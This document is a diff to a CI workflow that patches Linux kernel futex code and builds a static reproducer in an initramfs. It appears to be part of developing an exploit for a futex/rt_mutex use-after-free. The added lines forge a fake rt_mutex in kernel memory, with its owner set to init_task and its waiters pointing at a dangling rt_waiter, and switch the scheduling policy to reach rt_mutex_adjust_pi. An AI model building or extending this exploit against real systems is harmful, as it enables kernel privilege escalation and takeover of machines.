@@ -71,6 +71,7 @@ jobs:
                           s = s.replace('&%s' % cand, '&ghostlock_bootid_%s' % cand)
                           if 'ghostlock_scratch' not in s:
                               s += '\nunsigned long ghostlock_scratch[8] __attribute__((aligned(64)));\n'
+                              s += 'unsigned long ghostlock_fakelock[8] __attribute__((aligned(64)));\n'
                           open(fn, 'w').write(s)
                           break
                   if boot_name:
@@ -86,7 +87,7 @@ jobs:
           if 'extern unsigned long ghostlock_scratch' not in f:
               fidx = f.find('#include')
               feol = f.find('\n', fidx)
-              f = f[:feol+1] + '\nextern unsigned long ghostlock_scratch[8];\n' + f[feol+1:]
+              f = f[:feol+1] + '\nextern unsigned long ghostlock_scratch[8];\nextern unsigned long ghostlock_fakelock[8];\n' + f[feol+1:]
           needle = 'struct rt_mutex_waiter rt_waiter;'
           cnt = f.count(needle)
           if cnt >= 2:
@@ -100,7 +101,14 @@ jobs:
               else:
                   cap = "\n"
               cap += ("\tpr_info(\"DBG rt_waiter=%px\\n\", &rt_waiter);\n"
-                      "\tghostlock_scratch[0] = (unsigned long)&rt_waiter;")
+                      "\tghostlock_scratch[0] = (unsigned long)&rt_waiter;\n"
+                      "\t/* 构造假锁 @ ghostlock_fakelock（rt_mutex 布局）：\n"
+                      "\t *   [0]=wait_lock(0=解锁) [1]=waiters.rb_node=幽灵 tree_entry\n"
+                      "\t *   [2]=rb_leftmost=幽灵 [3]=owner=init_task */\n"
+                      "\tmemset(ghostlock_fakelock, 0, sizeof(ghostlock_fakelock));\n"
+                      "\tghostlock_fakelock[1] = (unsigned long)&rt_waiter;\n"
+                      "\tghostlock_fakelock[2] = (unsigned long)&rt_waiter;\n"
+                      "\tghostlock_fakelock[3] = (unsigned long)&init_task;")
               f = f[:idx+len(needle)] + cap + f[idx+len(needle):]
               print('futex.c rt_waiter capture OK (total decls=%d pad=%d)' % (cnt, pad))
           elif cnt == 1:
@@ -222,7 +230,7 @@ jobs:
           tail -3 kbuild.log
           ls -la arch/arm64/boot/Image
           grep -E " init_task$" System.map
-          grep -E "ghostlock_bootid|ghostlock_scratch" System.map
+          grep -E "ghostlock_bootid|ghostlock_scratch|ghostlock_fakelock" System.map
 
       - name: Build static repro and init
         run: |
@@ -230,7 +238,8 @@ jobs:
           INIT_TASK=$(grep ' init_task$' System.map | awk '{print $1}')
           BOOT_ID=$(grep 'ghostlock_bootid' System.map | awk '{print $1}')
           SCRATCH=$(grep 'ghostlock_scratch' System.map | awk '{print $1}')
-          echo "INIT_TASK=$INIT_TASK BOOT_ID=$BOOT_ID SCRATCH=$SCRATCH"
+          FAKELOCK=$(grep 'ghostlock_fakelock' System.map | awk '{print $1}')
+          echo "INIT_TASK=$INIT_TASK BOOT_ID=$BOOT_ID SCRATCH=$SCRATCH FAKELOCK=$FAKELOCK"
           mkdir -p ../initramfs/proc ../initramfs/dev ../initramfs/sys
           cat > ../initramfs/repro.c << EOF
           #define _GNU_SOURCE
@@ -253,6 +262,7 @@ jobs:
           #define ANCHOR_BOOTID  0x${BOOT_ID}ULL
           #define ANCHOR_INIT    0x${INIT_TASK}ULL
           #define ANCHOR_SCRATCH 0x${SCRATCH}ULL
+          #define ANCHOR_FAKELOCK 0x${FAKELOCK}ULL
 
           struct sched_attr_x {
             uint32_t size; uint32_t sched_policy; uint64_t sched_flags;
@@ -291,7 +301,7 @@ jobs:
               struct sched_attr_x attr;
               memset(&attr, 0, sizeof(attr));
               attr.size = sizeof(attr);
-              attr.sched_policy = SCHED_NORMAL;
+              attr.sched_policy = SCHED_BATCH;  /* 换 policy 才走 rt_mutex_adjust_pi（原版同款） */
               attr.sched_nice = (i % 19) + 1;
               long r = syscall(SYS_sched_setattr, waiter_tid, &attr, 0);
               printf("REPRO consumer sched_setattr i=%d tid=%d ret=%ld errno=%d idx=%d\n", i, waiter_tid, r, errno, dance_idx);
@@ -318,7 +328,7 @@ jobs:
             struct { int w; unsigned long v; } words[] = {
               {0, ANCHOR_COMM}, {1, 0}, {2, ANCHOR_BOOTID},
               {3, ANCHOR_COMM}, {4, 0}, {5, ANCHOR_BOOTID},
-              {6, ANCHOR_INIT}, {7, ANCHOR_SCRATCH}, {8, 130}, {9, 0},
+              {6, ANCHOR_INIT}, {7, ANCHOR_FAKELOCK}, {8, 130}, {9, 0},
             };
             for (unsigned i = 0; i < sizeof(words)/sizeof(words[0]); i++) {
               int gw = word_shift + words[i].w;
